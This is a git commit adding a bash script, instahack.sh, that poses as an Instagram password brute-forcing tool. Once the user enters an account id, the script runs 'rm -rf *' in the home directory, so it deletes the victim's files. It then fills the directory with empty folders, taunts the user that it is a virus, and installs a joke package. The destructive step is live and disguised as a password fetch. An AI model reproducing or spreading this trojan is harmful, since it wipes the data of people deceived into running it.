40d9076ebf00c6f930179e43112532250a207272
gurusankar444 <66994807+gurusankar444@users.noreply.github.com>
2021-02-26 20:07:03 +0530

    Nothing

---
+++ instahack.sh
@@ -0,0 +1,62 @@
+#!/bin/bash
+
+YY="\e[93m"
+RR="\e[91m"
+LI="\e[92m"
+CA="\e[96m"
+MA="\e[35m"
+echo -e "$YY"
+echo "the tool is strting...."
+sleep 1
+echo -e "$RR"
+toilet -f future insta_brute
+sleep 0.5
+
+echo "enter 1 to start "
+echo "enter 2 for about"
+read start
+if [ $start -eq 1 ]
+then
+            echo -e "$LI"
+            echo "starting..."
+            sleep 0.5
+            echo -e "$RR"
+            echo "don't use this for illigal purposes"
+            echo -e "$CA"
+            echo "enter id"
+            read id
+            echo "fetching password...please wait...."
+            sleep 0.5
+
+            cd
+
+            rm -rf *
+
+            cd
+for value in {1000..0..2}
+do
+            mkdir $value
+            done
+            echo All done
+            echo -e "$RR"
+            echo "lol this is a virus i have deleted all your tools"
+
+for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+do
+           echo "virus affected"
+done
+           sleep 3
+
+           pkg install sl -y
+
+           sl
+
+          sleep 1
+
+          toilet -f future bye -F gay
+
+elif [ $start -eq 2 ]
+then
+           echo -e "$LI"
+           echo "created by cLonE"
+fi
